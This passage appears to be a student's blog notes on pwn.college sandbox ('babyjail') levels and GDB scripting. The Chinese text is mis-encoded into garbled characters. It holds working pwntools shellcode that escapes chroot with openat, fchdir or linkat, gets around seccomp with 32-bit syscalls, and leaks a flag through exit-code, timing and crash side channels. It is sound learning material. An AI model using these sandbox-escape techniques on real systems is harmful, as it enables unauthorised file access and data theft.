title="1.exemplify"></a>1.exemplify</h3><p>ç›¸å½“ç®€å•, ç›´æ¥åˆ©ç”¨ç¨‹åºä¸­chrootåæ²¡æœ‰åˆ‡æ¢åˆ°jailé‡Œé¢çš„ç‰¹ç‚¹, æ›´æ”¹cwdä¸ºçœŸæ­£çš„æ ¹ç›®å½•, ç¬¬ä¸€ä¸ªå‚æ•°å¡«å†™ä¸ºflag, æœ€åopençš„æ—¶å€™ç”±äºflagæ˜¯ç›¸å¯¹åœ°å€, ä¼šä»¥çœŸæ­£çš„æ ¹ç›®å½•ä½œä¸ºåŸºå‡†æ¥å®šä½true flag.</p><h3 id="2-åŒç¬¬ä¸€é¢˜"><a href="#2-åŒç¬¬ä¸€é¢˜" class="headerlink" title="2.åŒç¬¬ä¸€é¢˜"></a>2.åŒç¬¬ä¸€é¢˜</h3><blockquote><p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸èƒ½å«æœ‰flagå­—ç¬¦ä¸², æ˜¯ä¸ºäº†ç¦æ­¢ç›´æ¥æ‰“å¼€flagæ–‡ä»¶. åœ¨è¿™ä¸ªchallengeä¸­è¿˜å¯ä»¥æ³¨å…¥shellcode, </p></blockquote><p>ä¹Ÿæ²¡ä»€ä¹ˆéš¾çš„, åªè¦åœ¨shellcodeé‡Œé¢æ‰“å¼€â€˜flagâ€™ç„¶åå†™åˆ°stdiné‡Œé¢å°±å¯ä»¥äº†.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/baby*[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br>p = process([binary, <span class="hljs-string">b&#x27;abc&#x27;</span>]) <span class="hljs-comment">#ä¸èƒ½ç›´æ¥æ‰“å¼€flagæ–‡ä»¶</span><br><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;O_RDWR&#x27;</span>)<br>shellcode+= <span class="hljs-string">&#x27;lea r8, [rip]\nadd r8, 0x100&#x27;</span><span class="hljs-comment">#å†™åˆ°bufä¸Š, ä¼°è®¡å¾ˆå¿«å°±ä¸è¡Œäº†.</span><br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br>payload += <span class="hljs-string">b&#x27;\x0f\x04&#x27;</span><span class="hljs-comment"># éšæ‰‹åŠ ä¸ªéæ³•æŒ‡ä»¤,é‡åˆ°SIGILLå°±çŸ¥é“shellcodeè‚¯å®šæ˜¯æ‰§è¡Œå®Œäº†.</span><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><h3 id="3-move-in"><a href="#3-move-in" class="headerlink" title="3.move in"></a>3.move in</h3><p>å‚æ•°ä¸èƒ½å«æœ‰flagå­ä¸², æ‰“å¼€æ–‡ä»¶æ—¶æœ‰O_NOFOLLOWæ ‡å¿—, è½¯è¿æ¥æ— æ•ˆ,  è€Œä¸”åœ¨chdirä¹‹å‰åªæœ‰ä¸€ä¸ªopen.<br>ä¹Ÿä¸èƒ½åœ¨å‘½ä»¤è¡Œé‡Œæ‰“å¼€flag, åŒ…æ‹¬ç¬¦å·é“¾æ¥. è¦è·³å‡ºchrootä¹Ÿè®¸åªå‰©ä¸‹å†æ¬¡chroot. å¥½åƒä¹Ÿä¸è¡Œ, çœ‹äº†çœ‹è§†é¢‘åº”è¯¥è¦ç”¨openat.<br>åœ¨kaliä¸Šè¯•è¯•chroot. openatæˆåŠŸäº†.</p><ul><li>directory stream file descriptorå’Œfile descriptorä¸æ˜¯åŒä¸€ä¸ªä¸œè¥¿, å…·ä½“èµ„æ–™å¾…æŸ¥. openatåªèƒ½ç”¨dirfd.</li><li>å‘½ä»¤è¡Œé‡Œæ‰“å‡º<code>./chroot flag 6&lt;.</code>å³å¯, ä¼šæ‰“å¼€å½“å‰æ–‡ä»¶å¤¹ä¸”dirfd=6.</li><li><strong>ä¹Ÿå¯ä»¥ç›´æ¥æ‰“å¼€fd=3, è¿™ä¸ªæ˜¯å‘½ä»¤è¡Œç¬¬ä¸€ä¸ªå‚æ•°, è€Œä¸”åœ¨chrootå‰è¢«æ‰“å¼€, å¯ä»¥è¢«openatä½¿ç”¨.</strong> </li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/&quot;</span>+os.uname().nodename<br>context.binary = binary<br><br>shellcode = shellcraft.amd64.openat(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>) <br>shellcode += shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>) <br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/home/hacker/input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(payload)<br></code></pre></div></td></tr></table></figure><h3 id="4-seccomped-gt-openat"><a href="#4-seccomped-gt-openat" class="headerlink" title="4.seccomped -&gt; openat"></a>4.seccomped -&gt; openat</h3><blockquote><p>æ¯ä¸€é¢˜çš„è¦æ±‚éƒ½åœ¨é€æ¸å¢åŠ . è¿™ä¸€é¢˜ä»ç„¶å¯ä»¥ç”¨openat, æ²¡æœ‰å˜åŒ–.</p></blockquote><h3 id="5-linkat"><a href="#5-linkat" class="headerlink" title="5. linkat"></a>5. linkat</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = shellcraft.amd64.linkat(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;AT_FDCWD&quot;</span>, <span class="hljs-string">&#x27;/f&#x27;</span>, <span class="hljs-number">0</span>)<br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>)<br>shellcode+= shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>)<br></code></pre></div></td></tr></table></figure><h3 id="6-fchdir"><a href="#6-fchdir" class="headerlink" title="6.fchdir"></a>6.fchdir</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = shellcraft.amd64.fchdir(<span class="hljs-number">6</span>)                       <br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>)<br>shellcode+= shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>)<br></code></pre></div></td></tr></table></figure><h3 id="7-æ²¡æœ‰atäº†"><a href="#7-æ²¡æœ‰atäº†" class="headerlink" title="7.æ²¡æœ‰atäº†"></a>7.æ²¡æœ‰atäº†</h3><p>å…è®¸çš„syscall:</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">chdir</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">80</span>).<br>chroot (<span class="hljs-keyword">number</span> <span class="hljs-number">161</span>).<br><span class="hljs-built_in">mkdir</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">83</span>).<br><span class="hljs-keyword">open</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">2</span>).<br><span class="hljs-keyword">read</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">0</span>).<br><span class="hljs-keyword">write</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">1</span>).<br>sendfile (<span class="hljs-keyword">number</span> <span class="hljs-number">40</span>).<br></code></pre></div></td></tr></table></figure><p>ä½¿ç”¨å†æ¬¡chroot:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = shellcraft.amd64.mkdir(<span class="hljs-string">&quot;/temp&quot;</span>, <span class="hljs-number">0o777</span>)<br>shellcode+= shellcraft.amd64.chroot(<span class="hljs-string">&quot;/temp&quot;</span>)             <br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../../flag&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>)<br>shellcode+= shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>)<br></code></pre></div></td></tr></table></figure><h3 id="8-openat-read-write-send"><a href="#8-openat-read-write-send" class="headerlink" title="8.openat read write send"></a>8.openat read write send</h3><p>æ„Ÿè§‰æ²¡ä»€ä¹ˆç‰¹åˆ«çš„. å‚æ•°å·²ç»ä¸é™åˆ¶è¾“å…¥flagäº†. ç›´æ¥ä½¿ç”¨ç¬¬ä¸‰é¢˜çš„ä¸œè¥¿.</p><h3 id="9-å˜æˆ32ä½"><a href="#9-å˜æˆ32ä½" class="headerlink" title="9.å˜æˆ32ä½"></a>9.å˜æˆ32ä½</h3><p>syscall no: 3,4,5,6: <strong>close, stat, fstat, lstat.</strong> ???????????</p><p>å“¦å¯¹, ç¨‹åºé‡Œçš„seccompæ˜¯é€šè¿‡SCMP_SYS() macroæ¥add ruleçš„, ç„¶ååˆæŠŠarchè®¾ç½®æˆx86_32, è¿™æ ·çš„è¯å°±æ˜¯32ä½çš„read write open closeè¿™å››ä¸ªç³»ç»Ÿè°ƒç”¨äº†. è€Œä¸”æ²¡æœ‰chroot.</p><p>å°è¯•ä½¿ç”¨pwntoolsé‡åˆ°å„ç§å„æ ·çš„é—®é¢˜.</p><ul><li>64å’Œ32ä»£ç æ˜¯æ€ä¹ˆåˆ‡æ¢çš„? int 0x80 and syscallå—? æ˜¯çš„, 22å¹´10æœˆçŸ¥é“äº†. </li><li>int 0x80åœ¨64ä½æ¨¡å¼ä¸‹æ±‡ç¼–, pushæœ€å¤šDWORD. ä¸ç„¶operand mismatch.</li><li>å­—ç¬¦ä¸²çš„åœ°å€åªèƒ½ä½¿ç”¨æ±‡ç¼–ä¸­çš„label, æ ˆä¸Šçš„åœ°å€ä»ç„¶æ˜¯64ä½çš„, å¯èƒ½æ˜¯å› ä¸ºè¿‡é•¿å¯¼è‡´openä¸èƒ½ä½¿ç”¨.</li><li>64ä½æ±‡ç¼–è‚¯å®šå°±ä¸èƒ½ç”¨SYS_readè¿™ç§äº†, åªèƒ½æ”¹æˆæ•°å­—. </li></ul><p>ç²¾ç®€å¦‚ä¸‹(ä¹Ÿæ²¡å¤šç²¾ç®€):</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">/* open(file=&#x27;/flag&#x27;, oflag=&#x27;O_RDWR&#x27;, mode=0) */<br>/* push b&#x27;/flag\x00&#x27; */<br>lea ebx, [rip+flag]<br>mov ecx, 0x2<br>xor edx, edx<br>/* call open() */<br>mov eax, 5<br>int 0x80<br>/* read(fd=&#x27;eax&#x27;, buf=0x1337100, nbytes=0x99) */<br>mov ebx, eax<br>mov ecx, 0x1337100<br>mov rdx, 0x99<br>/* call read() */                               <br>push 3/* 3 */<br>pop rax<br>int 0x80<br>/* write(fd=1, buf=0x1337100, n=0x32) */<br>mov ebx, 0x1<br>mov ecx, 0x1337100<br>mov rdx, 0x99<br>/* call write() */<br>mov eax, 4<br>int 0x80<br><br>flag:<br>    .ascii &quot;/flag&quot;<br>    .byte 0 #åŠ ä¸åŠ æ²¡æœ‰åŒºåˆ«, mapä¸Šå»çš„åœ°å€ç©ºé—´éƒ½æ˜¯é›¶<br></code></pre></div></td></tr></table></figure><h3 id="10-side-channel-communication"><a href="#10-side-channel-communication" class="headerlink" title="10.side channel communication"></a>10.side channel communication</h3><blockquote><p>éƒ½æ²¡æœ‰chrootäº†. è¿™é¢˜ä½¿ç”¨exitæ¯æ¬¡è¿”å›ä¸€å­—èŠ‚.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/babyjail_level10&quot;</span><br>context.binary = binary<br><br>ans = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    shellcode =  <span class="hljs-string">&#x27;mov r8, rdx\nmov r9, r8\nadd r8, 0x100&#x27;</span><br>    shellcode += shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)<br>    shellcode += <span class="hljs-string">&#x27;mov r10, [r8+&#x27;</span>+<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&#x27;]\n&#x27;</span><br>    shellcode += shellcraft.amd64.exit(<span class="hljs-string">&#x27;r10&#x27;</span>)<br>    payload = asm(shellcode)<br>    p = process([binary, <span class="hljs-string">&#x27;/flag&#x27;</span>])<br>    p.sendline(payload)<br>    exitCode = p.poll(<span class="hljs-number">1</span>)<br>    ans += <span class="hljs-built_in">chr</span>(exitCode)<br>    i += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></div></td></tr></table></figure><h3 id="11-nanosleep"><a href="#11-nanosleep" class="headerlink" title="11.nanosleep"></a>11.nanosleep</h3><blockquote><p>è¿™ä¸‹å­çœŸçš„æ˜¯bitwiseçš„æ”¶é›†æ•°æ®äº†</p></blockquote><p>é‡åˆ°çš„å‡ ä¸ªé—®é¢˜:</p><ul><li>å¶ç„¶ä¼šå‘ç”Ÿbroken tube, ä¸çŸ¥åŸå› .</li><li>å¯ä»¥ç”¨å­—ç¬¦ä¸²çš„formatå‡½æ•°. </li><li>åœ¨pwn.collegeæœºå­ä¸Štimespecç»“æ„ä½“ä¸¤ä¸ªæˆå‘˜éƒ½æ˜¯<strong>å…«å­—èŠ‚(åŒ…æ‹¬long)</strong> </li><li>è¢«ç½‘ä¸ŠæŠ„æ¥çš„32ä½ç¨‹åºnasmå‘äº†ä¸€æŠŠ, ç°åœ¨æ˜¯64ä½gas, åŸºæœ¬å…¨æ”¹äº†â€¦â€¦â€¦.</li><li>setnzæ˜¯æ€ç»´å¯¼å›¾é‡Œçœ‹åˆ°çªç„¶æƒ³èµ·æ¥èƒ½ç”¨çš„. ä»¥å‰æ•´å¾—ç¬”è®°è¿˜ä¸é”™.</li><li>ç›´æ¥ä½¿ç”¨labelåœ°å€ä¼šæœ‰é‡å®šä½æ¡ç›®, å¿…é¡»ä½¿ç”¨ripæ¥åŠ ä¸Šæ ‡ç­¾çš„åç§»æ¥åœ¨è¿è¡Œæ—¶ç¡®å®šå‡†ç¡®çš„åœ°å€.</li><li>åŠ è½½åœ°å€è¯·ç”¨leaâ€¦â€¦line 15å¡äº†åå‡ åˆ†é’Ÿâ€¦..</li><li>è§†é¢‘ä¸­æ¼”ç¤ºäº†timeå‘½ä»¤, è®¡ç®—ç¨‹åºè¿è¡Œæ—¶é—´.</li><li>ä¹Ÿå¯ä»¥ç›´æ¥å†™åœ¨æ ˆä¸Š, ä¸ç”¨åœ¨æ±‡ç¼–é‡Œå†™ä¸Šè¿™ä¹ˆä¸€ä¸ªæ•°æ®ç»“æ„.</li><li>å¦‚æœæŠŠæ—¶é—´èŒƒå›´è°ƒå¤§ä¸€ç‚¹ä¹Ÿèƒ½ç”¨æ—¶é—´æ¥è¡¨ç¤ºasciiç å€¼, ä¹Ÿå°±æ˜¯ä¸€æ¬¡ä¸€å­—èŠ‚. åº”è¯¥æ›´å¿«.</li><li>è§†é¢‘ä½¿ç”¨äº†ä¸€ä¸ªpwn.log.progresså’Œprocesså‚æ•°level, è¿™æ ·å­å°±ä¸ä¼šæœ‰ä¸€å †æ‰“å¼€å…³é—­å‘½ä»¤äº†.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/python</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/&quot;</span>+os.uname().nodename<br>context.binary = binary<br><br>bck1 = <span class="hljs-string">&#x27;mov r8, rdx\nmov r9, r8\nadd r8, 0x100\n&#x27;</span>+shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)+<span class="hljs-string">&#x27;xor rcx, rcx\n&#x27;</span><br>bck2 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    setnz cl</span><br><span class="hljs-string">    sal ecx, 4</span><br><span class="hljs-string">    mov [rip+tv_usec+3], cl</span><br><span class="hljs-string">    mov rax, 35</span><br><span class="hljs-string">    lea rdi, [rip+timeval]</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    //ç»å…¸éæ³•æŒ‡ä»¤,è‡³å°‘è®©æˆ‘çŸ¥é“shellcodeæ‰§è¡Œæ­£å¸¸</span><br><span class="hljs-string">    .ascii &quot;\x0f\x04&quot; </span><br><span class="hljs-string">    timeval:</span><br><span class="hljs-string">    tv_sec:  .8byte 0</span><br><span class="hljs-string">    tv_usec: .8byte 0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>ans = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    char = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        sc = bck1 <span class="hljs-comment">#è¿™ä¸ªå°±æ˜¯å¯¹readçš„ä¸€ä¸ªå°è£…</span><br>        <span class="hljs-comment">#ä¸‹é¢è¿™ä¸ªæ˜¯å–å‡ºä¸€å­—èŠ‚, ç„¶åæµ‹è¯•ç¬¬jä½æ˜¯å¦ä¸º1</span><br>        sc += <span class="hljs-string">&#x27;mov cl, [r8+&#x27;</span>+<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&#x27;]\ntest cl,&#x27;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-number">1</span>&lt;&lt;j)+<span class="hljs-string">&#x27;\n&#x27;</span><br>        sc += bck2<br><span class="hljs-comment">#ä¸Šé¢è¿™ä¸ªæ˜¯nanosleepçš„è°ƒç”¨å°è£…,ç§’æ•°ç”±jä½ç§»ä½èµ‹å€¼åˆ°timespecç»“æ„ä½“ä¸­ç¬¬äºŒä¸ªæˆå‘˜çš„ç¬¬å››ä¸ªå­—èŠ‚</span><br><span class="hljs-comment">#(ä»æœ€ä½ä½å¼€å§‹, å› ä¸ºæ˜¯å°ç«¯æ³•å­˜å‚¨),ç»“æœæ˜¯268,435,456(1 0000|00000000|00000000|00000000)ns</span><br><span class="hljs-comment">#æ— sleepå¤§æ¦‚æ˜¯0.05s,æ‰€ä»¥åˆ†ç•Œç‚¹ä¸º0.2s</span><br>        payload = asm(sc)<br>        start = time.time()<br>        p = process([binary, <span class="hljs-string">&#x27;/flag&#x27;</span>])<br>        p.sendline(payload)<br>        p.wait()<br>        end = time.time()<br>        elapse = end - start<br>        <span class="hljs-keyword">if</span> elapse &gt; <span class="hljs-number">0.2</span>:<br>            char |= <span class="hljs-number">1</span>&lt;&lt;j<br>    <span class="hljs-comment">#end for bits loop</span><br>    ans += <span class="hljs-built_in">chr</span>(char)<br><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></div></td></tr></table></figure><h3 id="12-only-read"><a href="#12-only-read" class="headerlink" title="12.only read"></a>12.only read</h3><p>è¿™æ¬¡æ¢æˆcrash codeå°±è¡Œäº†. <code>-4Â </code>is <code>SIGILL</code>, <code>-11</code> is <code>SIGSEGV</code> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#ä¸€ç‚¹å°æ”¹åŠ¨</span><br>bck2 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">jnz isZero</span><br><span class="hljs-string">.ascii &quot;\x0f\x04&quot;</span><br><span class="hljs-string">isZero: .byte 0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> p.poll(<span class="hljs-number">1</span>) == -<span class="hljs-number">4</span>:<br>    char |= mask<br></code></pre></div></td></tr></table></figure><h3 id="13-æ€ä¹ˆæ˜¯socket"><a href="#13-æ€ä¹ˆæ˜¯socket" class="headerlink" title="13.æ€ä¹ˆæ˜¯socket??"></a>13.æ€ä¹ˆæ˜¯socket??</h3><blockquote><p>use socketpair to the local communication </p><p>æ„Ÿè§‰æ²¡æœ‰ä»»ä½•é™åˆ¶å•Š, å°±æ˜¯æ„é€ ä¸€ç‚¹çˆ¶å­è¿›ç¨‹é—´ç‰¹æœ‰çš„å‘½ä»¤.</p></blockquote><p>å¼€å§‹gdb refresher!!!!!</p><h1 id="module-6-gdb"><a href="#module-6-gdb" class="headerlink" title="module 6-gdb"></a>module 6-gdb</h1><p>GDBæ—¶é—´!</p><ul><li>infoæœ‰å¥½å¤šä¸œè¥¿. çœ‹åˆ°ä¸€ä¸ª<code>i proc m(appings)</code>, ä¸å°±æ˜¯æˆ‘ä¸Šæ¬¡ç”¨çš„<code>! cat /proc/pid/maps</code>ä¹ˆ.</li><li> ä¸€ä»½è¶…å¥½çœ‹çš„<a href="https://www.cs.umd.edu/class/spring2015/cmsc414/downloads/gdb-refcard.pdf">cheatsheet</a>!</li><li>pwndbgçš„<a href="https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md">features</a> </li><li>ç¥å¥‡çš„æ•™ç¨‹ç½‘ç«™, è§†é¢‘æ˜¯æ–‡å­—. <a href="https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Dbg1012_GDB_1+2021_v1/course/">link</a> </li><li>ä¸‰ç§gdbæ’ä»¶â€“gef(<a href="https://demo.gef.blah.cat/">demoç½‘ç«™</a>|<a href="https://gef.readthedocs.io/en/master/">doc</a>), å…¶ä»–ä¸¤ä¸ªè£…å¥½äº†. è¿˜æ˜¯pedaå®‰è£…ç®€å•, è¿˜èƒ½æ•´åˆ°pwncollegeä¸Š. å†ç”¨ä¸€ä¸ªæ’ä»¶æˆ‘ä¼šæ··çš„â€¦.</li></ul><p>â€œAuto-loading safe pathâ€ section in the GDB manual.</p><p>å‰å‡ é¢˜éƒ½æ²¡ä»€ä¹ˆç‰¹åˆ«çš„, å°±æ˜¯ä¸€ä¸ªrefresher.</p><p>å‘½ä»¤è¡Œé€‰é¡¹: <code>/challenge/e* -x gdbscrip -q</code> </p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>å±…ç„¶è¦é‡å¤å››æ¬¡, ç›´æ¥ä¿®æ”¹æ¨å¯¼å˜é‡. è€Œä¸”æ²¡æœ‰è¿è¡Œå‰åŠ ä¸Šæ–­ç‚¹ä¼šå‡ºé”™â€¦.åŸå› å¾…æŸ¥.</p><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>å¼€å§‹ç¼–å†™gdbè„šæœ¬. æ²¡æœ‰å°è¯•è¿‡çš„ä¸œè¥¿, é©¬ä¸Šå¼€å­¦.</p><p>æŸ¥çœ‹gdb manual, <code>5.1.7 Breakpoint Command Lists</code>æœ‰æåˆ°ä¸€ç§ç‰¹åˆ«çš„å†™æ³•:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">commands [list.<span class="hljs-string">..</span>]<br><span class="hljs-string">...</span> command-list <span class="hljs-string">...</span><br>end<br></code></pre></div></td></tr></table></figure><p>Any other command after a command that resumes execution will be ignored. </p><p>Can use <code>silent</code> to disable the printing of usual message when stopping at certain breakpoint. Usefull command for contolled output in <code>23.1.4 Commands for Controlled Output</code>, usually <code>echo, output, and printf</code> </p><p>You can also use breakpoint commands to compensate for one bug and test the 